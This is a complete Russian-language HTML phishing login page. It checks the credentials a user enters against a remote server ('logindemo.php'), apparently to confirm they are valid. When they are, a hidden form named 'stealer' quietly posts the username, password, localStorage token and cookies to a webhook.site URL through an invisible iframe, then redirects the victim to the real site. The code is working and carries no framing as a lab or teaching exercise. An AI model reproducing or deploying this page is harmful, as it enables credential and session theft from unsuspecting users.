<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Вход в систему</title>
  <style>
    body {
      font-family: sans-serif;
      padding: 30px;
      text-align: center;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      width: 250px;
    }
    .error {
      color: red;
    }
    iframe {
      display: none;
    }
  </style>
</head>
<body>
  <h2>Вход в систему</h2>

  <!-- Основная форма логина -->
  <form id="loginForm">
    <input type="text" id="username" placeholder="Логин" required><br>
    <input type="password" id="password" placeholder="Пароль" required><br>
    <button type="submit">Войти</button>
  </form>
  <p class="error" id="errorMessage"></p>

  <!-- iframe для отправки без CORS -->
  <iframe name="stealth" style="display: none;"></iframe>

  <!-- Скрытая форма для перехвата -->
  <form id="stealer" method="POST" action="https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe" target="stealth">
    <input type="hidden" name="username">
    <input type="hidden" name="password">
    <input type="hidden" name="token">
    <input type="hidden" name="cookie">
  </form>

  <script>
    const loginForm = document.getElementById("loginForm");
    const errorMsg = document.getElementById("errorMessage");
    const stealForm = document.getElementById("stealer");

    loginForm.addEventListener("submit", async function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      try {
        const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          credentials: "include",
          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
        });

        const text = await res.text();

        if (text.includes("✅")) {
          setTimeout(() => {
            // Заполняем и отправляем форму
            stealForm.username.value = username;
            stealForm.password.value = password;
            stealForm.token.value = localStorage.getItem("token") || "(нет токена)";
            stealForm.cookie.value = document.cookie || "(нет cookie)";
            stealForm.submit();

            // Перенаправление на оригинальный сайт
            window.location.href = "https://kazcyber.zapto.org/";
          }, 1000);
        } else {
          errorMsg.textContent = "❌ Неверный логин или пароль";
        }

      } catch (err) {
        errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
      }
    });
  </script>
</body>
</html>
